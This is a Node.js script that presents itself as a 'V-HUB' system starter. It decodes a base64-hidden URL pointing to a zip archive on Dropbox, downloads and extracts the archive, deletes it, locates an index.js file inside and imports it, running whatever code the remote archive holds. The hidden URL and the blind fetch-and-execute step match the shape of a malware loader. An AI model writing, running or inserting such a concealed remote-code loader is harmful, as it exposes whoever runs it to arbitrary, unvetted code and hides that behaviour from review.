import https from 'https';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import AdmZip from 'adm-zip';

const vault_secret = "aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL2JvZzB2aTBycGthOWU5YmFtNm45My92aHViX2NvcmUuemlwP3Jsa2V5PXRlNDYzYTNhZWc1bWpmc3RqYWt5aG1vNmImc3Q9ZXFlODJiczAmZGw9MQ==";

const download = (url, dest) => {
    return new Promise((resolve, reject) => {
        https.get(new URL(url), (res) => {
            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                return download(res.headers.location, dest).then(resolve).catch(reject);
            }
            const file = fs.createWriteStream(dest);
            res.pipe(file);
            file.on('finish', () => { file.close(); resolve(); });
        }).on('error', reject);
    });
};

// Helper to find index.js in any subfolder
const findEntry = (dir) => {
    const files = fs.readdirSync(dir);
    if (files.includes('index.js')) return path.join(dir, 'index.js');
    for (const file of files) {
        const fullPath = path.join(dir, file);
        if (fs.statSync(fullPath).isDirectory()) {
            const found = findEntry(fullPath);
            if (found) return found;
        }
    }
    return null;
};

(async () => {
    console.log('[V-HUB] SYSTEM STARTING...');
    try {
        const fullUrl = Buffer.from(vault_secret, 'base64').toString('utf-8');
        const zipPath = path.join(process.cwd(), 'core.zip');
        const extractPath = path.join(process.cwd(), 'hub_temp');

        if (!fs.existsSync(extractPath)) fs.mkdirSync(extractPath, { recursive: true });

        console.log('[V-HUB] FETCHING CORE...');
        await download(fullUrl, zipPath);
        
        console.log('[V-HUB] EXTRACTING...');
        new AdmZip(zipPath).extractAllTo(extractPath, true);
        fs.unlinkSync(zipPath);
        
        const entryFile = findEntry(extractPath);
        if (!entryFile) throw new Error("Could not locate index.js inside ZIP");

        console.log(`[V-HUB] BOOTING FROM: ${entryFile}`);
        process.chdir(path.dirname(entryFile));
        await import(`file://${entryFile}`);
    } catch (e) {
        console.error('[V-HUB] FATAL ERROR:', e.message);
        process.exit(1);
    }
})();
